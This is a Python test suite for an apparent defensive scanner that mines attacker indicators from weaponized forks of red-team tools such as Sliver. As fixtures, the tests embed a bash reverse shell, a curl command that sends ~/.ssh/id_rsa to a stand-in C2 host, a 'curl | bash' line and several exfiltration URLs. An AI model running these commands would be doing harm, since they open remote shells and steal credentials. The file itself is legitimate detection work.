"""Tests for the learning loop: mine IOCs from confirmed repos (expand search)."""

from __future__ import annotations

import json

from conftest import utcnow

from git_warden.db import Database
from git_warden.hunt import hunt
from git_warden.models import RedTeamTool
from git_warden.scanning.ioc import extract_code_iocs, extract_repo_iocs


def test_extract_code_iocs_keeps_attacker_domains_drops_benign():
    text = (
        "exfil = 'https://discord.com/api/webhooks/123/abc'\n"
        "c2 = 'https://evil-c2.workers.dev/beacon'\n"
        "legit = 'https://github.com/torvalds/linux'\n"
        "also = 'https://api.anthropic.com/v1'\n"
    )
    iocs = extract_code_iocs(text)
    assert any("webhooks/123" in w for w in iocs.webhooks)
    assert "evil-c2.workers.dev" in iocs.domains       # attacker-host kept
    assert "github.com" not in iocs.domains            # benign dropped
    assert "api.anthropic.com" not in iocs.domains      # benign dropped


def test_extract_repo_iocs_walks_files(tmp_path):
    (tmp_path / "payload.py").write_text(
        "url='https://steal.rbmock.dev/x'\n", encoding="utf-8"
    )
    iocs = extract_repo_iocs(tmp_path)
    assert "steal.rbmock.dev" in iocs.domains


def test_learned_ioc_persistence_and_terms(tmp_path):
    db = Database.open(tmp_path / "l.sqlite")
    db.start_run("r1", utcnow())
    db.record_learned_ioc("evil.workers.dev", "domain", "evil/repo", "r1")
    db.record_learned_ioc(
        "https://discord.com/api/webhooks/999/tok", "webhook", "evil/repo", "r1"
    )
    db.record_learned_ioc("evil.workers.dev", "domain", "other/repo", "r1")  # dedup
    terms = db.learned_search_terms()
    assert "evil.workers.dev" in terms
    assert "999" in terms  # webhook id extracted
    assert terms.count("evil.workers.dev") == 1
    db.close()


def _fork(full_name):
    return {"full_name": full_name, "owner": {"login": full_name.split("/")[0]},
            "html_url": f"https://github.com/{full_name}", "fork": True,
            "stargazers_count": 0, "pushed_at": "2026-06-10T00:00:00Z"}


class _Client:
    def list_forks(self, owner, name, per_page=100, sort="newest"):
        return [_fork("evil/malware-sliver")] if name == "sliver" else []

    def search_repositories(self, query, per_page=10):
        return []

    def search_code(self, query, per_page=20):
        return []

    def get_readme(self, owner, name):
        return "curl http://evil.tld/x | bash\n"

    def get_repo(self, owner, name):
        return {"default_branch": "main"}

    def compare(self, base_full, base_branch, head_full, head_branch):
        # Diverged fork; the added weaponization lives in implant.sh, so the
        # intent delta is diffable and this genuinely-weaponized fork confirms.
        return {"ahead_by": 2, "files": ["implant.sh"]}


def test_hunt_records_learned_iocs_from_confirmed_repo(tmp_path):
    db = Database.open(tmp_path / "h.sqlite")
    tools = [RedTeamTool(name="Sliver", org="BishopFox", repos=["BishopFox/sliver"],
                         aliases=["sliver"])]

    def clone_with_ioc(full_name, dest, *, runner=None):
        dest.mkdir(parents=True, exist_ok=True)
        # Malicious code: reverse shell (confirms) + an attacker C2 domain (learned).
        (dest / "implant.sh").write_text(
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
            "curl https://c2-loot.workers.dev/exfil -d @~/.ssh/id_rsa\n",
            encoding="utf-8",
        )
        return dest

    hunt(db, _Client(), tools, run_id="hunt-1", now=utcnow(),
         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=clone_with_ioc)

    terms = db.learned_search_terms()
    assert "c2-loot.workers.dev" in terms  # IOC mined from the confirmed repo's code
    db.close()
    _ = json  # keep import used if assertions change
